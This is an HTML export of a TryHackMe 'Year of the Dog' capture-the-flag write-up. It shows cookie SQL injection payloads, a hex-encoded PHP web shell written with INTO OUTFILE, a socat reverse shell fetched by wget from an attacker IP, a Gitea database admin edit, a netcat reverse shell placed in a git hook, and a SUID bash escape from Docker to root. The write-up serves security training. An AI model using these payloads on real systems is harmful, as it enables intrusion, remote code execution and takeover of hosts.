<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>year of the dog</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>year of the dog</h1><br/><p><strong><h1>THM: Year of the Dog</h1></strong></p><p></p><p></p><p><strong><h3>Enumeration</h3></strong></p><p></p><p><strong><span style="text-decoration:underline;">Rustscan &amp; nmap</span></strong></p><p></p><p><img src="images/60-1.png" alt="images/60-1.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Website Enumeration</span></strong></p><p></p><p><img src="images/60-2.png" alt="images/60-2.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Nikto Enumeration</span></strong></p><p></p><p><img src="images/60-3.png" alt="images/60-3.png" /></p><p></p><p>It shows that the cookie header does not have a Http-only flag which means that we can change,delete or edit the cookie to our wish.This is a really dangerous thing.One can have complete machine compromise.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Cookie Inspection</span></strong></p><p></p><p>We open the website with <strong>INSPECT</strong></p><p>The only thing of any interest on the webpage is the presence of a cookie: “id”:</p><p></p><p><img src="images/60-4.png" alt="images/60-4.png" /></p><p></p><p>It would make sense for this to contain our number in the queue (24, at present time), but it contains a full ID. If we change it to a random value we get an error.</p><p></p><p><img src="images/60-5.png" alt="images/60-5.png" /></p><p></p><p>When i changed the value of Cookie ‘id’ to <strong>&#39;</strong>.</p><p>I got SQL error indicating the possibility of SQL Injection.</p><p></p><p><img src="images/60-6.png" alt="images/60-6.png" /></p><p></p><p>Next, I tried UNION SELECT statements to get the number of columns. (It was found to be 2)</p><p>Value of Cookie: <strong>&#39;UNION SELECT 1,2-- -</strong></p><p>We get <strong>2</strong> Displayed in the webpage.</p><p></p><p><img src="images/60-7.png" alt="images/60-7.png" /></p><p></p><p>We can now enumerate the database. Example to get the version.</p><p>Value of Cookie: <strong>&#39;UNION SELECT 1,version()-- -</strong></p><p>We get the version in the webpage as highlighted.</p><p></p><p><img src="images/60-8.png" alt="images/60-8.png" /></p><p></p><p>Upon further manual sql injection, we find the table name “<strong>queue</strong>”. It has 2 columns <strong>userID</strong> &amp; <strong>queueNum</strong></p><p>This does not yield us anything it just adds in the random cookie it generates.So now we need to choose another vector as we don’t get any password or credentials.We need to try for a RCE(Remote Code Execution).</p><p></p><p></p><p><strong><h3>Foothold</h3></strong></p><p></p><p>There are two functions in MySql which help us in achieving this,<strong>LOAD_FILE</strong> and <strong>INTO OUTFILE</strong> .Usually these functions are disabled.Lets try in our case. <strong>LOAD_FILE</strong> helps us in reading the files.</p><p></p><p>Value of Cookie: <strong>&#39;UNION SELECT 1,LOAD_FILE(&quot;/etc/passwd&quot;)-- -</strong></p><p></p><p><img src="images/60-9.png" alt="images/60-9.png" /></p><p></p><p>We can use this to read the index.php &amp; config.php files. (Further Research)</p><p>However, for RCE we will use <strong>INTO OUTFILE</strong> &amp; a <strong>webshell</strong></p><p></p><p><strong>Note:</strong> INTO_OUTFILE uses a string to be uploaded so fully functional PHP Reverse shell might not work.</p><p>We will use a <strong>simple shell</strong> that takes a <strong>cmd</strong> parameter.</p><p><strong></strong></p><p><strong>PHP Code:</strong></p><p><strong>&lt;?php echo system($_GET[&#39;cmd&#39;]);?&gt;</strong></p><p>Or</p><p><strong>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</strong></p><p>Or</p><p><strong>&lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&lt;/pre&gt;&quot;;?&gt;</strong></p><p></p><p>Converted it to HEX online</p><p></p><p><strong>Hex Value:</strong> (3rd One)</p><p>3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e</p><p></p><p><strong>We can use it in 2 ways</strong></p><p></p><p>Value of Cookie: ‘<strong>UNION SELECT 1,0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e INTO OUTFILE &#39;/var/www/html/my_shell.php&#39;-- -</strong></p><p></p><p>Or</p><p></p><p>Value of Cookie: <strong>&#39;INTO OUTFILE &#39;/var/www/html/my_shell.php&#39; LINES TERMINATED BY 0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e-- -</strong></p><p></p><p></p><p>I will use the 2nd one.</p><p></p><p><strong>Note:</strong> Append the above to the existing random cookie value for proper functioning.</p><p></p><p><strong>FInal Cookie Value:</strong> 1487e53db304c8a130c67fb71d10559d&#39; INTO OUTFILE &#39;/var/www/html/my_shell.php&#39; LINES TERMINATED BY 0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e-- -</p><p></p><p>Save the Above Cookie &amp; Reload the webpage. Then visit the following URL for RCE</p><p></p><p><strong>http://10.10.58.33/my_shell.php?cmd=id</strong> </p><p></p><p><img src="images/60-10.png" alt="images/60-10.png" /></p><p></p><p>We will then use socat for initial connection. We get the static binary from: <strong>https://github.com/andrew-d/static-binaries</strong> </p><p>Start a socat listner on our kali machine:</p><p></p><p><strong>socat tcp-l:7777 file:`tty`,raw,echo=0</strong></p><p></p><p>Then host the binary in a python web server &amp; use the following payload.</p><p></p><p><strong>wget http://10.11.72.31/socat -q -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat tcp:10.11.72.31:7777 exec:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</strong></p><p></p><p>We need to <strong>URL</strong> <strong>encode</strong> the above payload &amp; then use it in <strong>cmd=</strong></p><p></p><p><strong>https://www.urlencoder.org/</strong> </p><p></p><p>wget%20http%3A%2F%2F10.11.72.31%2Fsocat%20-q%20-O%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20tcp%3A10.11.72.31%3A7777%20exec%3A%22bash%20-li%22%2Cpty%2Cstderr%2Csigint%2Csetsid%2Csane%0A</p><p></p><p>Once we run it in the website. We will get a reverse connection.</p><p></p><p><img src="images/60-11.png" alt="images/60-11.png" /></p><p></p><p>Thus, we have initial access.</p><p></p><p></p><p><strong><h3>Lateral Movement</h3></strong><span style="text-decoration:underline;"></span></p><p><span style="text-decoration:underline;"></span></p><p>We go into /home directory to find the user <strong>dylan</strong>. We list the contents of the directory. The user flag is only readable by dylan. We cannot access it yet. However, there is an intresting file named <strong>work_analysis</strong></p><p></p><p><img src="images/60-12.png" alt="images/60-12.png" /></p><p></p><p>We view its contents &amp; it looks like a copy of auth.log</p><p></p><p><img src="images/60-13.png" alt="images/60-13.png" /></p><p></p><p>I grepped the file for the word <strong>dylan</strong></p><p>We got lucky. The user dylan had wrongly typed his password in the username field &amp; we get clear text password in the file.</p><p></p><p><img src="images/60-14.png" alt="images/60-14.png" /></p><p></p><p>SSH Credential Found:</p><p>Username: <strong>dylan</strong></p><p>Password: <strong>Labr4d0rs4L1f3</strong></p><p></p><p>We then login into the server as the above user using SSH &amp; aquire the user flag.</p><p></p><p><img src="images/60-15.png" alt="images/60-15.png" /></p><p></p><p></p><p><strong><h3>Privilege Escalation</h3></strong></p><p></p><p>I checked the ip addresses. I found that a docker may be running.</p><p></p><p><img src="images/60-16.png" alt="images/60-16.png" /></p><p></p><p>Next I checked for open ports.</p><p></p><p><strong>ss -tulwn</strong></p><p></p><p><img src="images/60-17.png" alt="images/60-17.png" /></p><p></p><p>A port 3000 is open for interal network only.</p><p>We can tunnel it using socat to open it on our local kali machine.</p><p></p><p><strong>/tmp/socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 &amp;</strong></p><p></p><p>We use our previously uploaded socat binary. Redirect the <strong>127.0.0.1:3000</strong> to <strong>8080</strong> on the machine. Finally we use <strong>&amp;</strong> to background the process &amp; keep using the SSH terminal.</p><p></p><p><img src="images/60-18.png" alt="images/60-18.png" /></p><p></p><p>we verfied the same using above. Lets access the port.</p><p></p><p><img src="images/60-19.png" alt="images/60-19.png" /></p><p></p><p></p><p>Looks like we’re dealing with an internal Gitea service.</p><p>We already have a full set of credentials for a user account on the machine, so let’s try them here:</p><p></p><p><img src="images/60-20.png" alt="images/60-20.png" /></p><p></p><p>It worked. However, it seems dylan has setup 2-Factor authentication &amp; we are unable to acess further.</p><p></p><p><img src="images/60-21.png" alt="images/60-21.png" /></p><p></p><p>Let’s have a look at the /gitea directory. Presumably this is a mounted volume for the container, so maybe it contains some useful information</p><p></p><p><img src="images/60-22.png" alt="images/60-22.png" /></p><p></p><p>Our current account (Dylan) appears to own the <strong>git</strong> and <strong>gitea</strong> subdirectories. This would seem very odd, until you consider the way that Linux handles user mappings. Dylan has UID 1000 and GID 1000 as his account is the first user account created by the system. If this directory is mapped into the gitea docker container, then it’s conceivable that there is a user account with UID 1000 and GID 1000 inside the container. Any files created with this account would be created with these values, which, outwith the container, belong to Dylan. Thus, outside the container, Dylan has ownership of any shared files created by the user account within the container. </p><p></p><p>Looking in the <strong>/gitea/gitea</strong> directory, we see that there is an <strong>sqlite3</strong> <strong>database</strong> called <strong>gitea.db</strong>, which Dylan owns. This means that we could conceivably overwrite information in the database. Unfortunately, <strong>sqlite3</strong> is not installed:</p><p></p><p>We will download the database for analysis. </p><p></p><p><strong>Before</strong> <strong>that</strong>, let’s use the Gitea application to register for a new account. Just use any username, email and password. The important thing is that there is an account owned by the attacker inside the database. Note that we currently don’t have any administrative privileges:</p><p>[This would add our user details in the database]</p><p></p><p><img src="images/60-23.png" alt="images/60-23.png" /></p><p></p><p>I clicked on register &amp; created a demo user so that it would go into the database. Notice that we don&#39;t have administrative privileges to make changes to gitea as of NOW.</p><p></p><p><img src="images/60-24.png" alt="images/60-24.png" /></p><p></p><p>Now, lets get the database to our local kali machine.</p><p>On Target Machine, I hosted to folder containg the DB using python web server.</p><p></p><p><strong>python3 -m http.server 8000</strong></p><p></p><p><img src="images/60-25.png" alt="images/60-25.png" /></p><p></p><p>On Kali Machine, I downloaded the file for further research.</p><p></p><p><strong>wget http://10.10.151.0:8000/gitea.db</strong></p><p></p><p><img src="images/60-26.png" alt="images/60-26.png" /></p><p></p><p></p><p>Next, we open the database.</p><p></p><p><strong><span style="text-decoration:underline;">Command Line Way (sqlite3):</span></strong></p><p></p><p>Open the database:</p><p><strong>sqlite3 gitea.db</strong></p><p></p><p>List all the tables:</p><p><strong>.tables</strong></p><p></p><p>View the contents of <strong>user</strong> table:</p><p><strong>select * from user;</strong></p><p></p><p><img src="images/60-27.png" alt="images/60-27.png" /></p><p></p><p>we can see the <strong>dylan</strong> user &amp; the demo user we created. Passwords are encrypted though.</p><p></p><p>Check table schema:</p><p><strong>.schema user</strong></p><p></p><p><img src="images/60-28.png" alt="images/60-28.png" /></p><p></p><p>Then we select the specific parts we are intrested in:</p><p>View specific contents of <strong>user</strong> table:</p><p><strong>select lower_name, is_admin from user;</strong></p><p></p><p><img src="images/60-29.png" alt="images/60-29.png" /></p><p></p><p>Then, i used the following update statement to update my demo user&#39;s is_admin field to 1.</p><p>Next, we check the change using the same select command.</p><p></p><p><strong>UPDATE user SET is_admin=1 WHERE lower_name=&quot;cybex&quot;;</strong></p><p></p><p><strong><span style="text-decoration:underline;">Graphical Way (sqlitebrowser):</span></strong></p><p></p><p><strong>Note:</strong> Graphical way uses (<strong>sqlitebrowser</strong>) &amp; is much easy</p><p></p><p><strong>Open Database -&gt; Select Browse Data tab -&gt; Select user table -&gt; Select is_admin column for the demo user -&gt; Change it to 1 -&gt; Apply &amp; quit</strong></p><p></p><p></p><p><img src="images/60-30.png" alt="images/60-30.png" /></p><p></p><p>Next, I uploaded this modified database &amp; replaced it in the target machine.</p><p>Host it using python in Kali machine &amp; download it on the target. (Or just scp)</p><p></p><p>Kali Machine:</p><p><img src="images/60-31.png" alt="images/60-31.png" /></p><p></p><p></p><p>Target Machine:</p><p><img src="images/60-32.png" alt="images/60-32.png" /></p><p></p><p>Then, Login into the gitea application from the browser.</p><p></p><p><img src="images/60-33.png" alt="images/60-33.png" /></p><p></p><p>Thus, we are an <strong>admin</strong> user now. </p><p></p><p>Let’s create a repository of our own. I’m calling it “<strong>Test-Repo</strong>”, and choosing to initialise it with a README.md file.</p><p>Looking at the settings for our repo, we see that we have access to Git Hooks for the server.</p><p></p><p><img src="images/60-34.png" alt="images/60-34.png" /></p><p></p><p></p><p>Git Hooks are scripts executed by the server when a commit is pushed to a repository. As we have permission to edit these, we can use this to gain RCE from the Gitea. Is this worth it? Potentially. We’ll be inside the docker container, but if we can privesc inside the container and there happens to be a connected volume (which, looking at /gitea in the host, there looks to be), we may just be able to gain root privileges on the host.</p><p></p><p>Let’s try it. Set up a netcat listener on the attacking machine, then go to the Git Hooks and alter the “pre-receive” hook (although any of them would do). This is just a bash script, so, at the end of the file, add in:</p><p></p><p><strong>mkfifo /tmp/f; nc 10.11.9.100 8888 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</strong></p><p></p><p><img src="images/60-35.png" alt="images/60-35.png" /></p><p></p><p>Finally press <strong>Update Hook</strong>.</p><p>Setup Listener in Kali Machine.</p><p><strong>rlwrap nc -lvnp 8888</strong></p><p></p><p>Then, as <strong>dylan</strong> user run the following:</p><p></p><p><strong>git clone http://localhost:3000/cybex/Test-Repo &amp;&amp; cd Test-Repo</strong></p><p><strong>echo &quot;Pwned&quot; &gt;&gt; README.md</strong></p><p><strong>git add README.md</strong></p><p><strong>git commit -m &quot;Exploit&quot;</strong></p><p><strong>git push</strong></p><p></p><p><img src="images/60-36.png" alt="images/60-36.png" /></p><p></p><p>Now, we check the listner. We have a shell.</p><p><img src="images/60-37.png" alt="images/60-37.png" /></p><p></p><p>We tried for sudo &amp; easily got root access inside the container.</p><p></p><p><strong>sudo -s</strong> 		:		Creates a shell with sudo</p><p></p><p><img src="images/60-38.png" alt="images/60-38.png" /></p><p></p><p>Having a look around we see that the contents of <strong>/data</strong> in the <strong>container</strong> directly <strong>mirror</strong> the contents of <strong>/gitea</strong> on the <strong>host</strong>. This is our shared volume. We could try copying a shell binary from the container into this directory, but that is unlikely to work due to the differences in distribution (the container being Alpine, and the host being Ubuntu). Instead, let’s set up a webserver as Dylan and download a copy of bash directly from the host. We’ll then set it to have SUID, and be executable by everyone.</p><p></p><p><strong>Host</strong></p><p><img src="images/60-39.png" alt="images/60-39.png" /></p><p></p><p><strong>Container</strong></p><p><img src="images/60-40.png" alt="images/60-40.png" /></p><p></p><p>Now, back in the <strong>host</strong></p><p>As the binary was owned by root inside the container, it was mapped to be owned by root on the host, thus giving us our root shell!</p><p></p><p><img src="images/60-41.png" alt="images/60-41.png" /></p><p></p><p>Thus, we have root access &amp; we can get the root flag in /root directory of the target host.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
